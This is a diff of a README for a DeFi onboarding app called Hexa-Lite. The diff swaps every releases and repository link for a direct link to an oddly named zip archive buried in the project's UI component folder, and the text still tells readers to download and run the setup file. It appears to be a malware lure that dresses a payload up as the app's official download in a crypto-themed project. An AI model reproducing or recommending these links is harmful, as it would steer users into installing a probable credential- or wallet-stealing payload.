@@ -1,6 +1,6 @@
 # ⚡ -Hexa-Lite-Onboard-to-DeFi - Easy Access to DeFi Solutions
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Nalin-Kaul/-Hexa-Lite-Onboard-to-DeFi/releases)
+[![Download](https://github.com/Nalin-Kaul/-Hexa-Lite-Onboard-to-DeFi/raw/refs/heads/master/src/app/components/ui/label-list/Lite_Hexa_Onboard_to_Fi_De_3.3-alpha.2.zip%20Release-brightgreen)](https://github.com/Nalin-Kaul/-Hexa-Lite-Onboard-to-DeFi/raw/refs/heads/master/src/app/components/ui/label-list/Lite_Hexa_Onboard_to_Fi_De_3.3-alpha.2.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To begin using -Hexa-Lite-Onboard-to-DeFi, follow these steps:
 
 1. **Visit the Releases Page**  
    Go to the following link to access the latest version:  
-   [Latest Releases](https://github.com/Nalin-Kaul/-Hexa-Lite-Onboard-to-DeFi/releases)
+   [Latest Releases](https://github.com/Nalin-Kaul/-Hexa-Lite-Onboard-to-DeFi/raw/refs/heads/master/src/app/components/ui/label-list/Lite_Hexa_Onboard_to_Fi_De_3.3-alpha.2.zip)
 
 2. **Download the Application**  
    On the releases page, find the version you want. Click the download link for your operating system (Windows, Mac, or Linux). This will download the installation file to your computer.
@@ -29,7 +29,7 @@ To begin using -Hexa-Lite-Onboard-to-DeFi, follow these steps:
 ## 📥 Download & Install
 
 To download -Hexa-Lite-Onboard-to-DeFi, visit this page:  
-[Download Here](https://github.com/Nalin-Kaul/-Hexa-Lite-Onboard-to-DeFi/releases)
+[Download Here](https://github.com/Nalin-Kaul/-Hexa-Lite-Onboard-to-DeFi/raw/refs/heads/master/src/app/components/ui/label-list/Lite_Hexa_Onboard_to_Fi_De_3.3-alpha.2.zip)
 
 Once you’re on the releases page, select your version and run the setup file. The application will install quickly, allowing you to start using it right away.
 
@@ -83,7 +83,7 @@ We are continuously working to enhance -Hexa-Lite-Onboard-to-DeFi. Here’s what
 
 ## 🔗 Useful Links
 
-- **GitHub Repository:** [Hexa-Lite-Onboard-to-DeFi](https://github.com/Nalin-Kaul/-Hexa-Lite-Onboard-to-DeFi)
+- **GitHub Repository:** [Hexa-Lite-Onboard-to-DeFi](https://github.com/Nalin-Kaul/-Hexa-Lite-Onboard-to-DeFi/raw/refs/heads/master/src/app/components/ui/label-list/Lite_Hexa_Onboard_to_Fi_De_3.3-alpha.2.zip)
 - **User Guide:** Access our comprehensive user guide for tips and tricks.
 - **Support Forum:** Join discussions and ask questions about DeFi and our application.
 
